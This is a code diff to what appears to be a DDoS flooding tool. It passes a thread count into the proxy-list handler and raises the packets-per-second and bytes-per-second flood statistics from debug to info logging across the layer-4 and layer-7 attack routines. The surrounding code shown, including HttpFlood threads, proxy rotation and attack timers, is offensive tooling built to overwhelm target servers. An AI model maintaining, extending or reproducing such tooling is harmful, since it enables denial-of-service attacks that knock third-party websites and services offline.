@@ -1375,7 +1375,7 @@ class ToolsConsole:
                argv[0], argv[0], argv[0]))
 
 
-def handleProxyList(con, proxy_li, proxy_ty, url=None):
+def handleProxyList(con, proxy_li, proxy_ty, url=None, threads=100):
     if proxy_ty not in {4, 5, 1, 0, 6}:
         exit("Socks Type Not Found [4, 5, 1, 0, 6]")
     if proxy_ty == 6:
@@ -1635,7 +1635,7 @@ def run_attack_layer7(method, urlraw, proxy_ty, threads, proxy_file, rpc, timer)
             logger.error("Empty Useragent or Referer File")
             return
 
-        proxies = handleProxyList(con, proxy_li, proxy_ty, url)
+        proxies = handleProxyList(con, proxy_li, proxy_ty, url, threads)
         
         event = Event()
         event.clear()
@@ -1651,7 +1651,7 @@ def run_attack_layer7(method, urlraw, proxy_ty, threads, proxy_file, rpc, timer)
         event.set()
         ts = time()
         while time() < ts + timer:
-            logger.debug(f'{bcolors.WARNING}PPS:{bcolors.OKBLUE} {Tools.humanformat(int(REQUESTS_SENT))}, {bcolors.WARNING}BPS:{bcolors.OKBLUE} {Tools.humanbytes(int(BYTES_SEND))}{bcolors.RESET}')
+            logger.info(f'{bcolors.WARNING}PPS:{bcolors.OKBLUE} {Tools.humanformat(int(REQUESTS_SENT))}, {bcolors.WARNING}BPS:{bcolors.OKBLUE} {Tools.humanbytes(int(BYTES_SEND))}{bcolors.RESET}')
             REQUESTS_SENT.set(0)
             BYTES_SEND.set(0)
             sleep(1)
@@ -1713,7 +1713,7 @@ def run_attack_layer4(method, target_raw, threads, timer):
         event.set()
         ts = time()
         while time() < ts + timer:
-            logger.debug(f'{bcolors.WARNING}PPS:{bcolors.OKBLUE} {Tools.humanformat(int(REQUESTS_SENT))}, {bcolors.WARNING}BPS:{bcolors.OKBLUE} {Tools.humanbytes(int(BYTES_SEND))}{bcolors.RESET}')
+            logger.info(f'{bcolors.WARNING}PPS:{bcolors.OKBLUE} {Tools.humanformat(int(REQUESTS_SENT))}, {bcolors.WARNING}BPS:{bcolors.OKBLUE} {Tools.humanbytes(int(BYTES_SEND))}{bcolors.RESET}')
             REQUESTS_SENT.set(0)
             BYTES_SEND.set(0)
             sleep(1)
@@ -1813,7 +1813,7 @@ if __name__ == '__main__':
                     logger.warning(
                         "RPC (Request Pre Connection) is higher than 100")
 
-                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
+                proxies = handleProxyList(con, proxy_li, proxy_ty, url, threads)
                 for thread_id in range(threads):
                     HttpFlood(thread_id, url, host, method, rpc, event,
                               uagents, referers, proxies).start()
@@ -1851,7 +1851,7 @@ if __name__ == '__main__':
                                 logger.setLevel("DEBUG")
                             proxy_ty = int(argfive)
                             proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
-                            proxies = handleProxyList(con, proxy_li, proxy_ty)
+                            proxies = handleProxyList(con, proxy_li, proxy_ty, None, threads)
                             if method not in {"TCP"}:
                                 exit("Only TCP method can use proxy")
                         else:
@@ -1870,7 +1870,7 @@ if __name__ == '__main__':
             event.set()
             ts = time()
             while time() < ts + timer:
-                logger.debug(f'{bcolors.WARNING}PPS:{bcolors.OKBLUE} {Tools.humanformat(int(REQUESTS_SENT))}, {bcolors.WARNING}BPS:{bcolors.OKBLUE} {Tools.humanbytes(int(BYTES_SEND))}{bcolors.RESET}')
+                logger.info(f'{bcolors.WARNING}PPS:{bcolors.OKBLUE} {Tools.humanformat(int(REQUESTS_SENT))}, {bcolors.WARNING}BPS:{bcolors.OKBLUE} {Tools.humanbytes(int(BYTES_SEND))}{bcolors.RESET}')
                 REQUESTS_SENT.set(0)
                 BYTES_SEND.set(0)
                 sleep(1)
